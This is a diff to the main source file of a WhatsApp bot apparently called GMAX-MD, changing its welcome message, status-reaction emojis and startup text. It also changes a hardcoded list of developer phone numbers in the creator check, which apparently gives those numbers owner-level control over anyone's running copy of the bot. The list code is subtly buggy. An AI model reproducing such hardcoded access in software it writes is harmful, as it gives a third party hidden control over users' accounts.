@@ -112,7 +112,7 @@ const port = process.env.PORT || 9090;
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `*Hello there GMAX-TECH User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet GMAX-MD-V2 WhatsApp Bot.\n\n *Thanks for using GMAX-MD-V2 \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VaFytPbAojYm7RIs6l1x\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Gmaxtech2024/GMAX-MD-V2\n\n> © Powered BY MR-GMAX \ud83d\udda4`;
+  let up = `*Hello there GMAX-TECH User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet GMAX-MD WhatsApp Bot.\n\n *Thanks for using GMAX-MD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VaFytPbAojYm7RIs6l1x\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Gmaxtech2024/GMAX-MD-V2\n\n> © Powered BY Mr Gmax \ud83d\udda4`;
     conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/vQFfbhn/mrgmax.jpg` }, caption: up })
   }
   })
@@ -150,7 +150,7 @@ const port = process.env.PORT || 9090;
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await conn.decodeJid(conn.user.id);
-    const emojis = ['🤔', '🤩', '😘', '👍', '🦋', '🥰', '🥳', '😊', '🫡', '🤫', '🤗', '🫣', '😇', '😎', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🤎', '🖤', '🩶', '🤍', '🩷', '💝', '💖', '💗', '💓', '💞', '💕', '❤️‍🩹', '❣️', '💔', '❤️‍🔥', '🦚'];
+    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -198,7 +198,7 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('255624420157', '255622053093', '255753853473');
+    const jawad = ('255753853473', '255753853473', '255753853473');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -293,7 +293,7 @@ if (!isReact && senderNumber === botNumber) {
   if(!isOwner && config.MODE === "private") return
   if(!isOwner && isGroup && config.MODE === "inbox") return
   if(!isOwner && !isGroup && config.MODE === "groups") return
-
+   
   // take commands 
                  
   const events = require('./command')
@@ -768,7 +768,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("GMAX MD STARTED ✅");
+  res.send("GMAX-MD-V2 STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
